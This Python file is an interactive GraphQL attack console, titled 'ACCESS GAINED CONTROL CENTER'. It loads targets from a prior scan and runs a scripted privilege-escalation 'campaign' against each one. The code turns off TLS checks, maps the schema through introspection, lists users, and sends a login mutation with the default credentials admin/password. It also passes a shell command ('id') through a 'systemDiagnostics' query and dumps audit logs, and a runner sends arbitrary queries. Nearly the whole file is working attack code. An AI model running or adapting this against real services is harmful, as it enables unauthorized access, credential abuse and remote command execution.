import os
import json
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def load_scan_state(filepath="scan_results.json"):
    if not os.path.exists(filepath):
        print(f"[!] Scan state file '{filepath}' not found. Run a scan first.")
        return []
    try:
        with open(filepath, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Error loading scan state: {e}")
        return []

def paced_print(text, delay=0.03):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()

def interactive_session(target_info):
    url = target_info.get("target")
    method = target_info.get("method", "GET")
    vuln = target_info.get("vulnerability", "None")
    
    session = requests.Session()
    session.verify = False
    target_api = url.replace("/graphiql", "/graphql").split("?")[0]
    
    agent_memory = {
        "schema_cache": {},
        "discovered_users": [],
        "extracted_token": None
    }
    
    while True:
        print(f"\n=================================================================")
        print(f" ACTIVE SESSION: {method} {url}")
        print(f" INTELLIGENCE: {vuln}")
        print(f" AGENT MODE: Object-Introspecting PrivEsc Synthesizer")
        print(f"=================================================================")
        print(" [1] Send standard probe request")
        print(" [2] Run Introspective PrivEsc & Deep-Probe Campaign")
        print(" [3] Custom request runner")
        print(" [0] Back to Dashboard")
        
        choice = input("\nSelect session action [0-3]: ").strip()
        
        if choice == "0":
            print("\n[+] Returning to dashboard...")
            break
            
        elif choice == "1":
            try:
                res = session.post(target_api, json={"query": "{__schema { types { name } }}"}, timeout=15) if "graph" in url else session.get(url, timeout=15)
                print(f"\n[Response Status]: {res.status_code}")
                print(f"[Response Snippet]:\n{res.text[:600]}...")
            except Exception as e:
                print(f"[!] Request failed: {e}")
            input("\nPress Enter to continue...")
                
        elif choice == "2":
            print(f"\n=================================================================")
            paced_print(" [Agent Core] Initializing Introspective PrivEsc Campaign...")
            print(f"=================================================================\n")
            time.sleep(0.4)
            
            # Phase 1: Schema Ingestion
            paced_print(" [Phase 1] Mapping available queries and mutations...")
            intro_payload = {
                "query": "{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"
            }
            try:
                intro_res = session.post(target_api, json=intro_payload, timeout=15)
                schema_data = intro_res.json().get("data", {}).get("__schema", {})
                q_names = [f["name"] for f in schema_data.get("queryType", {}).get("fields", [])]
                m_names = [f["name"] for f in schema_data.get("mutationType", {}).get("fields", [])]
                
                paced_print(f"    [+] Queries: {q_names}")
                paced_print(f"    [+] Mutations: {m_names}")
                time.sleep(0.8)
                
                # Phase 2: User Enumeration
                print(f"\n-----------------------------------------------------------------")
                paced_print(" [Phase 2] Deep Probing: User Enumeration...")
                print(f"-----------------------------------------------------------------")
                
                if "users" in q_names:
                    user_query = "{ users { id username } }"
                    res = session.post(target_api, json={"query": user_query}, timeout=10)
                    paced_print(f"    [Result]: {res.text}")
                time.sleep(0.8)
                
                # Phase 3: Introspective Authentication Exploitation (`login` mutation)
                print(f"\n-----------------------------------------------------------------")
                paced_print(" [Phase 3] PrivEsc Vector: Introspecting 'Login' Object Type...")
                print(f"-----------------------------------------------------------------")
                
                if "login" in m_names:
                    # Step A: Introspect the fields of the "Login" object type
                    paced_print("    [->] Querying schema type '__type(name: \"Login\")' for valid sub-fields...")
                    type_intro_query = '{ __type(name: "Login") { fields { name } } }'
                    type_res = session.post(target_api, json={"query": type_intro_query}, timeout=10)
                    paced_print(f"    [Login Type Fields Discovery]: {type_res.text}")
                    
                    # Extract valid fields dynamically
                    try:
                        fields_data = type_res.json().get("data", {}).get("__type", {}).get("fields", [])
                        login_subfields = [f["name"] for f in fields_data]
                        paced_print(f"    [+] Discovered valid subfields for Login: {login_subfields}")
                        
                        if login_subfields:
                            subs_str = " ".join(login_subfields)
                            login_exploit = f'mutation {{ login(username: "admin", password: "password") {{ {subs_str} }} }}'
                            paced_print(f"    [->] Executing fully resolved login mutation...")
                            exploit_res = session.post(target_api, json={"query": login_exploit}, timeout=10)
                            paced_print(f"    [Exploit Result]: {exploit_res.text}")
                    except Exception as ex:
                        paced_print(f"    [!] Error parsing Login fields: {ex}")
                time.sleep(0.8)
                
                # Phase 4: Diagnostic & Audit Log Extraction
                print(f"\n-----------------------------------------------------------------")
                paced_print(" [Phase 4] Deep Probing: Diagnostic & Audit Log Extraction...")
                print(f"-----------------------------------------------------------------")
                
                if "systemDiagnostics" in q_names:
                    paced_print("    [->] Testing credential combinations on 'systemDiagnostics'...")
                    diag_query = '{ systemDiagnostics(username: "admin", password: "password", cmd: "id") }'
                    res = session.post(target_api, json={"query": diag_query}, timeout=10)
                    paced_print(f"    [Result]: {res.text}")
                
                if "audits" in q_names:
                    paced_print("    [->] Dumping system 'audits' logs...")
                    audit_query = '{ audits { id timestamp } }'
                    res = session.post(target_api, json={"query": audit_query}, timeout=10)
                    paced_print(f"    [Result]: {res.text[:800]}...")

                print(f"\n=================================================================")
                paced_print(" [+] Introspective PrivEsc Campaign Complete.")
                print(f"=================================================================")
                
            except Exception as e:
                print(f"[!] Campaign error: {e}")
                
            input("\nPress Enter to return to menu...")
                
        elif choice == "3":
            custom_payload = input("Enter custom GraphQL query: ").strip()
            try:
                if not custom_payload.startswith("{") and not custom_payload.startswith("mutation"):
                    custom_payload = f"{{ {custom_payload} }}"
                res = session.post(target_api, json={"query": custom_payload}, timeout=15)
                print(f"\n[Custom Response]: {res.status_code}\n{res.text[:1200]}")
            except Exception as e:
                print(f"[!] Error: {e}")
            input("\nPress Enter to continue...")
        else:
            print("[!] Invalid selection.")
            input("\nPress Enter to continue...")

def main():
    while True:
        os.system("clear" if os.name == "posix" else "cls")
        targets = load_scan_state()
        
        print("ACCESS GAINED CONTROL CENTER (INTROSPECTIVE PRIVESC)")
        print("=================================================================")
        if not targets:
            print(" No targets loaded. Please run a scan from main.py first.")
            input("\nPress Enter to exit...")
            break
            
        for idx, t in enumerate(targets, 1):
            print(f" {idx}. [{t.get('vulnerability', 'Endpoint')}] {t.get('target')} ({t.get('method')})")
            
        print(" 0. Exit Console")
        print("=================================================================")
        
        choice = input(f"Select target session [0-{len(targets)}]: ").strip()
        if choice == "0":
            print("\n[+] Exiting control center.")
            break
            
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                interactive_session(targets[idx])
            else:
                print("[!] Invalid selection.")
                input("\nPress Enter to continue...")
        except ValueError:
            print("[!] Please enter a valid number.")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    main()
